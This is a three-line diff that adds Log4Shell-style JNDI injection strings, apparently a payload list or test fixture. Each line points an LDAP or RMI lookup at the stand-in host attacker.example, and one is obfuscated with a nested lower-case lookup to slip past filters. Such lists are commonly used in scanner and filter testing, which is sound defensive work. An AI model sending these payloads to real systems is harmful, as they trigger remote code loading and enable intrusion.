@@ -1,0 +1,3 @@
+${jndi:ldap://attacker.example/a}
+${${lower:j}ndi:rmi://attacker.example/x}
+${jndi:rmi://attacker.example/x}
